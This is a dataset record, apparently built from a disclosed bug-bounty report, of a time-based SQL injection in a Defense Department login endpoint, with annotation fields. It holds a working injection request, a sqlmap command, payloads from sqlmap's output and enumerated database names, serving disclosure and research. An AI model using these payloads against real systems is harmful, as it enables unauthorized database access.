@@ -1,0 +1,46 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "malcolmx ",
+    "title": "time based SQL injection at [https://\u2588\u2588\u2588] [HtUS]",
+    "content": "\nHello,\nSummary\nwhile doing test on www.\u2588\u2588\u2588\u2588\u2588 I\u2019ve found that the endpoint at /olc/setlogin.php is vulnerable with SQL injection vulnerability\nVulnerable parameters\nusername\npassword\nPOC\nusing time based to verify , submit the below request\nCode 761 Bytes\n1POST /olc/setlogin.php HTTP/1.1\n2Host: www.\u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: UsafNoticeConsent=1; PHPSESSID=5r61rj890ogju3dvb5ptup2mn1; session=expiry=1657062712923491\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0\n5Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8Content-Type: application/x-www-form-urlencoded\n9Content-Length: 74\n10Origin: https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11Referer: https://www.\u2588\u2588\u2588\u2588/olc/sethomepage.html\n12Upgrade-Insecure-Requests: 1\n13Sec-Fetch-Dest: document\n14Sec-Fetch-Mode: navigate\n15Sec-Fetch-Site: same-origin\n16Sec-Fetch-User: ?1\n17Te: trailers\n18Connection: close\n19\n20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'%2b(select*from(select(sleep(5)))a)%2b'&\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nwe can see that the response time will be 5\n{\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588]\nsqlmap run command\nCode 147 Bytes\n1python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 --data=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&\u2588\u2588\u2588\u2588\u2588\u2588\" -p username --dbms=mysql \nif you got message got a 302 redirect to '[https://www.\u2588\u2588\u2588\u2588\u2588:443/olc/sethomepage.html](https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/olc/sethomepage.html)'. Do you want to follow? [Y/n] n\npress n to not follow the redirection\nwe can se that our target parameter is vulnerable\nCode 927 Bytes\n1POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n\n2sqlmap identified the following injection point(s) with a total of 586 HTTP(s) requests:\n3---\n4Parameter: username (POST)\n5    Type: boolean-based blind\n6    Title: OR boolean-based blind - WHERE or HAVING clause\n7    Payload: username=-1559' OR 4924=4924 OR 'XiUq'='JgnT&\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8\n9    Type: time-based blind\n10    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n11    Payload: \u2588\u2588\u2588\u2588\u2588' AND (SELECT 9612 FROM (SELECT(SLEEP(5)))xSGk) OR 'CPXv'='aouS&\u2588\u2588\u2588\u2588\u2588\u2588\n12---\n13[23:27:33] [WARNING] changes made by tampering scripts are not included in shown payload content(s)\n14[23:27:33] [INFO] the back-end DBMS is MySQL\n15web application technology: Apache\n16back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\n17[23:27:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\n18\n19[*] ending @ 23:27:34 /2022-07-05/\n\u2588\u2588\u2588\nadd --dbs will back to us with the databases\nCode 173 Bytes\n1available databases [13]:\n2[] \u2588\u2588\u2588\n3[] \u2588\u2588\u2588\u2588\u2588\u2588mobile\n4[] GET\n5[] information_schema\n6[] LEAM\n7[] leat\n8[] LEV\n9[] mysql\n10[] performance_schema\n11[] SET\n12[] test\n13[] testadmin\n14[*] testusers\nImpact\nattacker is able to get the database\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1663204200,
+    "report_url": "https://hackerone.com/reports/1627970",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Identify the vulnerable endpoint /olc/setlogin.php on the target website."
+        ],
+        [
+            2,
+            "Use a time-based SQL injection payload in the 'username' or 'password' parameter to confirm the vulnerability (e.g., ' OR (SELECT SLEEP(5))--)."
+        ],
+        [
+            3,
+            "Use sqlmap with the appropriate parameters to automate the exploitation and enumerate databases (e.g., --dbs)."
+        ]
+    ],
+    "vuln_description": "The endpoint /olc/setlogin.php is vulnerable to time-based SQL injection, allowing an attacker to manipulate the database queries by injecting malicious SQL code through the 'username' or 'password' parameters. This can lead to unauthorized access to database contents.",
+    "reason": "The vulnerability involves a straightforward SQL injection technique, commonly known and easily detectable with tools like sqlmap. The attack does not require complex interactions or understanding of novel application logic.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves manipulating the username and password parameters to execute arbitrary SQL commands, which is not directly related to authentication or authorization bypass through session or resource manipulation. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on injecting SQL payloads.",
+        "is_detectable": false
+    }
+}
